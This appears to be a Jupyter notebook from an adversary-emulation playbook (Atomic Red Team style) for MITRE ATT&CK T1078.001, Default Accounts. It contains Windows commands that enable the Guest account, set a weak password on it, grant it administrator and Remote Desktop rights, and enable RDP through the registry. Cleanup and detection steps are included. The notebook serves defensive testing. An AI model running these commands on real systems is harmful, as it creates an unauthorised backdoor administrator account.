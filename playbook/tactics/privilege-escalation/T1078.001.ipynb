{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "bfac700a",
   "metadata": {},
   "source": "# T1078.001 - Default Accounts\nAdversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)"
  },
  {
   "cell_type": "markdown",
   "id": "37f01ad0",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "844d76c8",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Enable Guest account with RDP capability and admin privileges",
    "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user guest /active:yes\nnet user guest Password123!\nnet localgroup Administrators guest /add\nnet localgroup \"Remote Desktop Users\" guest /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d509b65f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "594a6178",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet user guest /active:no >nul 2>&1\nnet localgroup Administrators guest /delete >nul 2>&1\nnet localgroup \"Remote Desktop Users\" guest /delete >nul 2>&1\nif 0 NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\nif 0 EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)\nif 0 EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "136a8154",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c66787ae",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Activate Guest Account",
    "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user guest /active:yes\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da6980b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "b614d4ef",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet user guest /active:no\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74e0e8e0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c2b2c346",
   "metadata": {},
   "source": "## Detection\nMonitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}